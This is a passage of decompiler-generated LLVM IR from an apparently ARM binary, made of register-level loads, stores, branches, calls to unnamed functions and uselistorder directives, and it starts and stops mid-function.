  store i8 %v1_ae2c, i8* %v4_ae2c, align 1
  %v0_ae30 = load i32, i32* @r7, align 4
  %v1_ae30 = add i32 %v0_ae30, 4
  %v2_ae30 = inttoptr i32 %v1_ae30 to i8*
  %v3_ae30 = load i8, i8* %v2_ae30, align 1
  %v4_ae30 = zext i8 %v3_ae30 to i32
  store i32 %v4_ae30, i32* %r3.global-to-local, align 4
  %v1_ae34 = add i32 %v0_ae30, 5
  %v2_ae34 = inttoptr i32 %v1_ae34 to i8*
  %v3_ae34 = load i8, i8* %v2_ae34, align 1
  %v4_ae34 = zext i8 %v3_ae34 to i32
  store i32 %v0_ae30, i32* @r1, align 4
  %v4_ae3c = mul nuw nsw i32 %v4_ae34, 256
  %v5_ae3c = or i32 %v4_ae3c, %v4_ae30
  store i32 %v5_ae3c, i32* %r2.global-to-local, align 4
  %v0_ae40 = load i32, i32* @sl, align 4
  %v1_ae40 = trunc i32 %v0_ae40 to i8
  %v3_ae40 = add i32 %v0_ae30, 6
  %v4_ae40 = inttoptr i32 %v3_ae40 to i8*
  store i8 %v1_ae40, i8* %v4_ae40, align 1
  store i32 %stack_var_-156.0.ph, i32* %r3.global-to-local, align 4
  %v0_ae48 = load i32, i32* @sl, align 4
  %v1_ae48 = trunc i32 %v0_ae48 to i8
  %v2_ae48 = load i32, i32* @r7, align 4
  %v3_ae48 = add i32 %v2_ae48, 7
  %v4_ae48 = inttoptr i32 %v3_ae48 to i8*
  store i8 %v1_ae48, i8* %v4_ae48, align 1
  %v0_ae4c = load i32, i32* @r6, align 4
  store i32 %v0_ae4c, i32* %r0.global-to-local, align 4
  %v4_ae50 = call i32 @function_e480(i32 %v0_ae4c, i32 %v0_ae30, i32 %v5_ae3c, i32 %stack_var_-156.0.ph)
  %v5_ae50 = trunc i32 %v4_ae50 to i8
  store i32 %v4_ae50, i32* %r0.global-to-local, align 4
  %v3_ae54 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ae54, i32* %r3.global-to-local, align 4
  %v3_ae58 = mul i32 %v3_ae54, 32
  store i32 %v3_ae58, i32* %r2.global-to-local, align 4
  %v0_ae5c = load i32, i32* @r5, align 4
  %v1_ae5c = add i32 %v0_ae5c, 16
  %v2_ae5c = inttoptr i32 %v1_ae5c to i32*
  %v3_ae5c = load i32, i32* %v2_ae5c, align 4
  store i32 %v3_ae5c, i32* %r1.global-to-local, align 4
  %v5_ae60 = mul i32 %v3_ae54, 24
  store i32 %v5_ae60, i32* %r2.global-to-local, align 4
  %v4_ae6442 = udiv i32 %v4_ae50, 256
  %v1_ae68 = trunc i32 %v4_ae6442 to i8
  %v2_ae68 = load i32, i32* @r7, align 4
  %v3_ae68 = add i32 %v2_ae68, 7
  %v4_ae68 = inttoptr i32 %v3_ae68 to i8*
  store i8 %v1_ae68, i8* %v4_ae68, align 1
  %v0_ae6c = load i32, i32* %r2.global-to-local, align 4
  %v1_ae6c = load i32, i32* @sb, align 4
  %v2_ae6c = add i32 %v1_ae6c, %v0_ae6c
  store i32 %v2_ae6c, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_ae74 = load i32, i32* @r7, align 4
  %v4_ae74 = add i32 %v3_ae74, 6
  %v5_ae74 = inttoptr i32 %v4_ae74 to i8*
  store i8 %v5_ae50, i8* %v5_ae74, align 1
  %v0_ae78 = load i32, i32* %r1.global-to-local, align 4
  %v1_ae78 = load i32, i32* %lr.global-to-local, align 4
  %v2_ae78 = add i32 %v1_ae78, 4
  %v3_ae78 = inttoptr i32 %v2_ae78 to i32*
  store i32 %v0_ae78, i32* %v3_ae78, align 4
  %v0_ae7c = load i32, i32* %r3.global-to-local, align 4
  %v1_ae7c = trunc i32 %v0_ae7c to i8
  %v2_ae7c = load i32, i32* %r2.global-to-local, align 4
  %v3_ae7c = load i32, i32* @sb, align 4
  %v4_ae7c = add i32 %v3_ae7c, %v2_ae7c
  %v5_ae7c = inttoptr i32 %v4_ae7c to i8*
  store i8 %v1_ae7c, i8* %v5_ae7c, align 1
  %v0_ae80 = load i32, i32* @sl, align 4
  %v1_ae80 = trunc i32 %v0_ae80 to i8
  %v2_ae80 = load i32, i32* %lr.global-to-local, align 4
  %v3_ae80 = add i32 %v2_ae80, 2
  %v4_ae80 = inttoptr i32 %v3_ae80 to i8*
  store i8 %v1_ae80, i8* %v4_ae80, align 1
  %v0_ae84 = load i32, i32* @sl, align 4
  %v1_ae84 = trunc i32 %v0_ae84 to i8
  %v2_ae84 = load i32, i32* %lr.global-to-local, align 4
  %v3_ae84 = add i32 %v2_ae84, 1
  %v4_ae84 = inttoptr i32 %v3_ae84 to i8*
  store i8 %v1_ae84, i8* %v4_ae84, align 1
  %v0_ae88 = load i32, i32* @sl, align 4
  %v1_ae88 = trunc i32 %v0_ae88 to i8
  %v2_ae88 = load i32, i32* %lr.global-to-local, align 4
  %v3_ae88 = add i32 %v2_ae88, 3
  %v4_ae88 = inttoptr i32 %v3_ae88 to i8*
  store i8 %v1_ae88, i8* %v4_ae88, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ae94 = load i32, i32* @r5, align 4
  store i32 %v0_ae94, i32* %r1.global-to-local, align 4
  store i32 %v3_a9e4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-160.0.ph, i32* %r2.global-to-local, align 4
  %v0_aea0 = load i32, i32* %lr.global-to-local, align 4
  %v6_aea8 = inttoptr i32 %v0_ae94 to i32*
  %v7_aea8 = call i32 @function_1372c(i32 %v3_a9e4, i32* %v6_aea8, i32 %stack_var_-160.0.ph, i32 16384, i32 %v0_aea0, i32 16)
  %v3_aeac = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_aeac, i32* %r3.global-to-local, align 4
  %v1_aeb0 = add i32 %v3_aeac, 1
  store i32 %v1_aeb0, i32* %r0.global-to-local, align 4
  %v1_aeb4 = load i32, i32* @fp, align 4
  %v9_aeb4 = icmp eq i32 %v1_aeb0, %v1_aeb4
  store i1 %v9_aeb4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_aeb0, i32* %stack_var_-40, align 4
  %v6_aebc = icmp slt i32 %v1_aeb0, %v1_aeb4
  br i1 %v6_aebc, label %dec_label_pc_ad14, label %dec_label_pc_acfc

dec_label_pc_aec4:                                ; preds = %dec_label_pc_a9f4
  store i32 %v3_a9e4, i32* %r0.global-to-local, align 4
  %v1_aec8 = call i32 @function_12e9c(i32 %v3_a9e4)
  store i32 %v1_aec8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aecc

dec_label_pc_aecc:                                ; preds = %dec_label_pc_a890, %dec_label_pc_aec4
  %v29_aed0 = phi i32 [ %v3_a9e4, %dec_label_pc_a890 ], [ %v1_aec8, %dec_label_pc_aec4 ]
  store i32 %v3_a890, i32* %r4.global-to-local, align 4
  store i32 %v15_a890, i32* %r8.global-to-local, align 4
  store i32 %v21_a890, i32* %sl.global-to-local, align 4
  ret i32 %v29_aed0

dec_label_pc_aed4:                                ; preds = %dec_label_pc_ad14
  %v1_aed4 = add i32 %v2_ad1c, 16
  %v2_aed4 = inttoptr i32 %v1_aed4 to i32*
  %v3_aed4 = load i32, i32* %v2_aed4, align 4
  store i32 %v3_aed4, i32* %r4.global-to-local, align 4
  %v0_aed8 = call i32 @function_fe24()
  store i32 %v0_aed8, i32* %r0.global-to-local, align 4
  %v3_aedc = load i32, i32* %stack_var_-40, align 4
  %v5_aee4 = mul i32 %v3_aedc, 24
  %v0_aee8 = load i32, i32* %r4.global-to-local, align 4
  %v1_aeec = load i32, i32* @sb, align 4
  %v2_aeec = add i32 %v1_aeec, %v5_aee4
  store i32 %v2_aeec, i32* %r1.global-to-local, align 4
  %v1_aef0 = and i32 %v0_aee8, 65280
  store i32 %v1_aef0, i32* %r3.global-to-local, align 4
  %v1_aee8 = udiv i32 %v0_aee8, 256
  %v3_aef4 = and i32 %v1_aee8, 65280
  store i32 %v3_aef4, i32* %r2.global-to-local, align 4
  %v3_aef8 = mul i32 %v0_aee8, 16777216
  store i32 %v3_aef8, i32* %ip.global-to-local, align 4
  %v1_aefc = add i32 %v2_aeec, 20
  %v2_aefc = inttoptr i32 %v1_aefc to i8*
  %v3_aefc = load i8, i8* %v2_aefc, align 1
  %v4_aefc = zext i8 %v3_aefc to i32
  store i32 %v4_aefc, i32* %lr.global-to-local, align 4
  %v4_af00 = mul nuw nsw i32 %v1_aef0, 256
  %v5_af00 = or i32 %v4_af00, %v3_aef8
  store i32 %v5_af00, i32* %ip.global-to-local, align 4
  %v2_af08 = call i32 @llvm.bswap.i32(i32 %v0_aee8)
  %v7_af0c = lshr i32 %v0_aed8, %v4_aefc
  %v8_af0c = add i32 %v7_af0c, %v2_af08
  %v3_af18 = mul i32 %v8_af0c, 16777216
  %v1_af1c = and i32 %v8_af0c, 65280
  store i32 %v1_af1c, i32* %r0.global-to-local, align 4
  store i32 %v5_a9d0, i32* %r2.global-to-local, align 4
  %v4_af28 = mul nuw nsw i32 %v1_af1c, 256
  %v5_af28 = or i32 %v4_af28, %v3_af18
  store i32 %v5_af28, i32* %r1.global-to-local, align 4
  %v2_af2c = call i32 @llvm.bswap.i32(i32 %v8_af0c)
  store i32 %v2_af2c, i32* %r3.global-to-local, align 4
  store i1 %v7_ad44, i1* %cpsr_z.global-to-local, align 1
  %v1_af34 = load i32, i32* @r5, align 4
  %v2_af34 = add i32 %v1_af34, 16
  %v3_af34 = inttoptr i32 %v2_af34 to i32*
  store i32 %v2_af2c, i32* %v3_af34, align 4
  br i1 %v2_ad44, label %dec_label_pc_af3c, label %dec_label_pc_ad4c

dec_label_pc_af3c:                                ; preds = %dec_label_pc_aed4, %dec_label_pc_ad40
  %v0_af3c = call i32 @function_fe24()
  store i32 %v0_af3c, i32* %r0.global-to-local, align 4
  store i32 %v3_aa34, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_af4c, i1* %cpsr_z.global-to-local, align 1
  %v1_af50 = load i32, i32* @r5, align 4
  %v2_af50 = add i32 %v1_af50, 12
  %v3_af50 = inttoptr i32 %v2_af50 to i32*
  store i32 %v0_af3c, i32* %v3_af50, align 4
  br i1 %v9_af4c, label %dec_label_pc_af58, label %dec_label_pc_af3c.dec_label_pc_ad60_crit_edge

dec_label_pc_af3c.dec_label_pc_ad60_crit_edge:    ; preds = %dec_label_pc_af3c
  %v1_ad64.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad60

dec_label_pc_af58:                                ; preds = %dec_label_pc_af3c, %dec_label_pc_ad4c
  %v0_af58 = call i32 @function_fe24()
  %v3_af60 = urem i32 %v0_af58, 65536
  store i32 %v3_af60, i32* %r0.global-to-local, align 4
  %v1_af68 = sub nsw i32 999, %v3_af60
  store i32 %v1_af68, i32* %r2.global-to-local, align 4
  %v3_af6c = sdiv i32 %v1_af68, 256
  store i32 %v3_af6c, i32* %r1.global-to-local, align 4
  %v3_af7039 = udiv i32 %v3_af60, 256
  store i32 %v3_af7039, i32* %r3.global-to-local, align 4
  %v1_af74 = trunc i32 %v3_af7039 to i8
  %v2_af74 = load i32, i32* @r5, align 4
  %v3_af74 = add i32 %v2_af74, 5
  %v4_af74 = inttoptr i32 %v3_af74 to i8*
  store i8 %v1_af74, i8* %v4_af74, align 1
  %v0_af78 = load i32, i32* %r0.global-to-local, align 4
  %v1_af78 = trunc i32 %v0_af78 to i8
  %v2_af78 = load i32, i32* @r5, align 4
  %v3_af78 = add i32 %v2_af78, 4
  %v4_af78 = inttoptr i32 %v3_af78 to i8*
  store i8 %v1_af78, i8* %v4_af78, align 1
  %v0_af7c = load i32, i32* %r1.global-to-local, align 4
  %v1_af7c = trunc i32 %v0_af7c to i8
  %v2_af7c = load i32, i32* @r6, align 4
  %v3_af7c = add i32 %v2_af7c, 5
  %v4_af7c = inttoptr i32 %v3_af7c to i8*
  store i8 %v1_af7c, i8* %v4_af7c, align 1
  store i32 %v3_aa38, i32* %r1.global-to-local, align 4
  %v1_af84 = load i32, i32* @r4, align 4
  %v9_af84 = icmp eq i32 %v3_aa38, %v1_af84
  store i1 %v9_af84, i1* %cpsr_z.global-to-local, align 1
  %v0_af88 = load i32, i32* %r2.global-to-local, align 4
  %v1_af88 = trunc i32 %v0_af88 to i8
  %v2_af88 = load i32, i32* @r6, align 4
  %v3_af88 = add i32 %v2_af88, 4
  %v4_af88 = inttoptr i32 %v3_af88 to i8*
  store i8 %v1_af88, i8* %v4_af88, align 1
  %v0_af8c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_af8c, label %dec_label_pc_af90, label %dec_label_pc_af58.dec_label_pc_ad6c_crit_edge

dec_label_pc_af58.dec_label_pc_ad6c_crit_edge:    ; preds = %dec_label_pc_af58
  %v1_ad70.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad6c

dec_label_pc_af90:                                ; preds = %dec_label_pc_af58, %dec_label_pc_ad60
  %v0_af90 = call i32 @function_fe24()
  %v1_af90 = trunc i32 %v0_af90 to i8
  store i32 %v0_af90, i32* %r0.global-to-local, align 4
  store i32 %v3_aa3c, i32* %r2.global-to-local, align 4
  %v4_af98 = sdiv i32 %v0_af90, 256
  store i32 %v4_af98, i32* %r3.global-to-local, align 4
  %v1_af9c = load i32, i32* @r4, align 4
  %v9_af9c = icmp eq i32 %v3_aa3c, %v1_af9c
  store i1 %v9_af9c, i1* %cpsr_z.global-to-local, align 1
  %v3_afa0 = load i32, i32* @r5, align 4
  %v4_afa0 = add i32 %v3_afa0, 58
  %v5_afa0 = inttoptr i32 %v4_afa0 to i8*
  store i8 %v1_af90, i8* %v5_afa0, align 1
  %v0_afa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_afa4 = trunc i32 %v0_afa4 to i8
  %v2_afa4 = load i32, i32* @r7, align 4
  %v3_afa4 = add i32 %v2_afa4, 1
  %v4_afa4 = inttoptr i32 %v3_afa4 to i8*
  store i8 %v1_afa4, i8* %v4_afa4, align 1
  %v0_afa8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_afa8, label %dec_label_pc_afac, label %dec_label_pc_ad78

dec_label_pc_afac:                                ; preds = %dec_label_pc_af90, %dec_label_pc_ad6c
  %v0_afac = call i32 @function_fe24()
  %v1_afac = trunc i32 %v0_afac to i8
  store i32 %v0_afac, i32* %r0.global-to-local, align 4
  %v4_afb043 = udiv i32 %v0_afac, 256
  %v1_afb4 = trunc i32 %v4_afb043 to i8
  %v2_afb4 = load i32, i32* @r7, align 4
  %v3_afb4 = add i32 %v2_afb4, 3
  %v4_afb4 = inttoptr i32 %v3_afb4 to i8*
  store i8 %v1_afb4, i8* %v4_afb4, align 1
  store i32 %v1_aa2c, i32* %r3.global-to-local, align 4
  store i1 %v2_afbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_afbc, label %bb108, label %bb107

bb107:                                            ; preds = %dec_label_pc_afac
  %v1_afc0 = load i32, i32* @r5, align 4
  %v2_afc0 = add i32 %v1_afc0, 16
  %v3_afc0 = inttoptr i32 %v2_afc0 to i32*
  %v4_afc0 = load i32, i32* %v3_afc0, align 4
  store i32 %v4_afc0, i32* %r3.global-to-local, align 4
  br label %bb108

bb108:                                            ; preds = %dec_label_pc_afac, %bb107
  %v3_afc4 = load i32, i32* @r7, align 4
  %v4_afc4 = add i32 %v3_afc4, 2
  %v5_afc4 = inttoptr i32 %v4_afc4 to i8*
  store i8 %v1_afac, i8* %v5_afc4, align 1
  %v0_afc8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_afc8, label %dec_label_pc_afd0, label %bb109

bb109:                                            ; preds = %bb108
  %v1_afc8 = load i32, i32* %r3.global-to-local, align 4
  %v2_afc8 = load i32, i32* @r6, align 4
  %v3_afc8 = add i32 %v2_afc8, 16
  %v4_afc8 = inttoptr i32 %v3_afc8 to i32*
  store i32 %v1_afc8, i32* %v4_afc8, align 4
  br label %dec_label_pc_ad8c

dec_label_pc_afd0:                                ; preds = %dec_label_pc_ad78, %bb108
  %v0_afd0 = call i32 @function_fe24()
  store i32 %v0_afd0, i32* %r0.global-to-local, align 4
  %v1_afd4 = load i32, i32* @r6, align 4
  %v2_afd4 = add i32 %v1_afd4, 16
  %v3_afd4 = inttoptr i32 %v2_afd4 to i32*
  store i32 %v0_afd0, i32* %v3_afd4, align 4
  br label %dec_label_pc_ad8c

dec_label_pc_afdc:                                ; preds = %dec_label_pc_ad8c
  %v0_afdc = load i32, i32* @r7, align 4
  %v1_afdc = add i32 %v0_afdc, 8
  store i32 %v1_afdc, i32* %r0.global-to-local, align 4
  store i32 %v5_a97c, i32* @r1, align 4
  %v1_afe4 = inttoptr i32 %v1_afdc to i8*
  %v2_afe4 = call i32 @function_10000(i8* %v1_afe4)
  store i32 %v2_afe4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_adf0

dec_label_pc_afec:                                ; preds = %dec_label_pc_aa1c
  %v1_aff4 = add i32 %v5_a97c, 8
  store i32 %v1_aff4, i32* %r1.global-to-local, align 4
  %v1_aff8 = add i32 %v5_a97c, 66
  store i32 %v1_aff8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_acfc.preheader

; uselistorder directives
  uselistorder i32 %v1_aff8, { 1, 0 }
  uselistorder i32 %v1_aff4, { 1, 0 }
  uselistorder i32 %v0_afac, { 0, 2, 1 }
  uselistorder i32 %v0_af90, { 0, 2, 1 }
  uselistorder i32 %v3_af60, { 0, 2, 1 }
  uselistorder i32 %v2_af2c, { 1, 0 }
  uselistorder i32 %v8_af0c, { 1, 2, 0 }
  uselistorder i32 %v3_aef8, { 1, 0 }
  uselistorder i32 %v0_aee8, { 2, 0, 1, 3 }
  uselistorder i32 %v1_aeb4, { 1, 2, 0 }
  uselistorder i32 %v1_aeb0, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_ae54, { 1, 0, 2 }
  uselistorder i32 %v4_ae50, { 0, 2, 1 }
  uselistorder i32 %v0_ae30, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_ae20, { 0, 2, 1 }
  uselistorder i32 %v4_ae04, { 1, 0 }
  uselistorder i32 %v7_ad28, { 2, 1, 0, 3 }
  uselistorder i32 %v0_acfc, { 1, 0 }
  uselistorder i1 %v7_ad44, { 2, 1, 0 }
  uselistorder i1 %v2_afbc, { 2, 3, 1, 0 }
  uselistorder i1 %v9_af4c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_ac84, { 1, 0, 2 }
  uselistorder i32 %v3_ab0c, { 1, 0, 2 }
  uselistorder i32 %v3_aaec, { 1, 0 }
  uselistorder i32 %tmp91, { 1, 0 }
  uselistorder i32 %v1_aa90, { 1, 0 }
  uselistorder i32 %v1_aa8c, { 2, 1, 0 }
  uselistorder i32 %v1_aa78, { 1, 0 }
  uselistorder i32 %v1_aa74, { 2, 1, 0 }
  uselistorder i32 %v1_aa6c, { 0, 2, 1 }
  uselistorder i32 %v3_aa64, { 2, 1, 0 }
  uselistorder i32 %v0_aa40, { 1, 0, 2 }
  uselistorder i32 %v3_aa34, { 2, 1, 3, 0 }
  uselistorder i32 %v1_aa2c, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v3_aa28, { 1, 0 }
  uselistorder i32 %v0_aa28, { 2, 1, 0 }
  uselistorder i32 %v0_aa20, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_aa1c, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_aa14, { 1, 0 }
  uselistorder i1 %v7_a9e8, { 1, 0 }
  uselistorder i32 %v3_a9e4, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_a9d0, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_a99c, { 1, 2, 0 }
  uselistorder i32 %v5_a97c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_a930, { 1, 0 }
  uselistorder i8 %v5_a920, { 1, 0 }
  uselistorder i32 %v5_a904, { 1, 0 }
  uselistorder i32 %v6_a8c8, { 1, 0 }
  uselistorder i32 %v2_a8b0, { 0, 3, 1, 2 }
  uselistorder i32 %v1_a894, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %sl.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r8.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r4.global-to-local, { 20, 21, 22, 16, 17, 18, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 19 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 61, 60, 62, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 2, 3, 4, 5, 28, 6, 7, 8, 29, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 18, 17, 19, 20, 22, 21, 24, 23, 0 }
  uselistorder i32* %r0.global-to-local, { 23, 1, 2, 26, 27, 24, 25, 29, 28, 30, 33, 31, 32, 34, 36, 35, 37, 39, 38, 40, 41, 42, 43, 45, 44, 46, 3, 4, 5, 8, 6, 7, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0 }
  uselistorder i32* %ip.global-to-local, { 11, 12, 13, 3, 0, 1, 2, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_afd0, { 1, 0 }
  uselistorder label %bb108, { 1, 0 }
  uselistorder label %dec_label_pc_aecc, { 1, 0 }
  uselistorder label %dec_label_pc_adf0, { 1, 0 }
  uselistorder label %dec_label_pc_ad8c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_acfc.preheader, { 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
}

define i32 @function_b00c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b00c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_b00c = load i32, i32* @r4, align 4
  %v15_b00c = load i32, i32* @r8, align 4
  %v1_b010 = urem i32 %arg1, 256
  store i32 %v1_b010, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_b010, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_b028 = urem i32 %arg3, 256
  store i32 %v1_b028, i32* @r4, align 4
  %v2_b02c = call i32 @function_13a94(i32 %v1_b010, i32 4)
  %v0_b030 = load i32, i32* @r5, align 4
  store i32 %v0_b030, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b040 = load i32, i32* @r4, align 4
  store i32 %v0_b040, i32* %r0.global-to-local, align 4
  %v5_b044 = inttoptr i32 %v0_b030 to i32*
  %v6_b044 = call i32 @function_a4e8(i32 %v0_b040, i32* %v5_b044, i32 2, i32 0)
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b05c = load i32, i32* @r5, align 4
  store i32 %v0_b05c, i32* %r1.global-to-local, align 4
  %v0_b060 = load i32, i32* @r4, align 4
  store i32 %v0_b060, i32* %r0.global-to-local, align 4
  %v5_b064 = trunc i32 %v6_b044 to i8
  %v6_b068 = inttoptr i32 %v0_b05c to i32*
  %v7_b068 = call i32 @function_a4e8(i32 %v0_b060, i32* %v6_b068, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_b06c = load i32, i32* @r5, align 4
  store i32 %v0_b06c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b068, i32* @r7, align 4
  %v0_b07c = load i32, i32* @r4, align 4
  store i32 %v0_b07c, i32* %r0.global-to-local, align 4
  %v4_b080 = inttoptr i32 %v0_b06c to i32*
  %v5_b080 = call i32 @function_a4e8(i32 %v0_b07c, i32* %v4_b080, i32 4, i32 64)
  %v0_b08c = load i32, i32* @r5, align 4
  store i32 %v0_b08c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b098 = load i32, i32* @r4, align 4
  store i32 %v0_b098, i32* %r0.global-to-local, align 4
  %v5_b09c = trunc i32 %v5_b080 to i8
  %v6_b0a0 = inttoptr i32 %v0_b08c to i32*
  %v7_b0a0 = call i32 @function_a4e8(i32 %v0_b098, i32* %v6_b0a0, i32 5, i32 1)
  %v1_b0ac = urem i32 %v7_b0a0, 256
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b0b8 = load i32, i32* @r5, align 4
  store i32 %v0_b0b8, i32* %r1.global-to-local, align 4
  %v0_b0bc = load i32, i32* @r4, align 4
  store i32 %v0_b0bc, i32* %r0.global-to-local, align 4
  %v5_b0c4 = inttoptr i32 %v0_b0b8 to i32*
  %v6_b0c4 = call i32 @function_a4e8(i32 %v0_b0bc, i32* %v5_b0c4, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_b0cc = load i32, i32* @r5, align 4
  store i32 %v0_b0cc, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b0c4, i32* @sl, align 4
  %v0_b0dc = load i32, i32* @r4, align 4
  store i32 %v0_b0dc, i32* %r0.global-to-local, align 4
  %v4_b0e0 = inttoptr i32 %v0_b0cc to i32*
  %v5_b0e0 = call i32 @function_a4e8(i32 %v0_b0dc, i32* %v4_b0e0, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_b0e4 = load i32, i32* @r5, align 4
  store i32 %v0_b0e4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_b0e0, i32* @r8, align 4
  %v0_b0f4 = load i32, i32* @r4, align 4
  store i32 %v0_b0f4, i32* %r0.global-to-local, align 4
  %v4_b0f8 = inttoptr i32 %v0_b0e4 to i32*
  %v5_b0f8 = call i32 @function_a4e8(i32 %v0_b0f4, i32* %v4_b0f8, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b108 = load i32, i32* @r5, align 4
  store i32 %v0_b108, i32* %r1.global-to-local, align 4
  %v0_b10c = load i32, i32* @r4, align 4
  store i32 %v0_b10c, i32* %r0.global-to-local, align 4
  %v4_b110 = inttoptr i32 %v0_b108 to i32*
  %v5_b110 = call i32 @function_a4e8(i32 %v0_b10c, i32* %v4_b110, i32 1, i32 1)
  %v1_b118 = urem i32 %v5_b110, 256
  %v0_b11c = load i32, i32* @r5, align 4
  store i32 %v0_b11c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b128 = load i32, i32* @r4, align 4
  store i32 %v0_b128, i32* %r0.global-to-local, align 4
  %v5_b130 = inttoptr i32 %v0_b11c to i32*
  %v6_b130 = call i32 @function_a4e8(i32 %v0_b128, i32* %v5_b130, i32 19, i32 0)
  %v0_b138 = load i32, i32* @r5, align 4
  store i32 %v0_b138, i32* %r1.global-to-local, align 4
  %v2_b13c = load i32, i32* @global_var_1e46c.86, align 4
  store i32 %v2_b13c, i32* %r3.global-to-local, align 4
  store i32 %v6_b130, i32* @r6, align 4
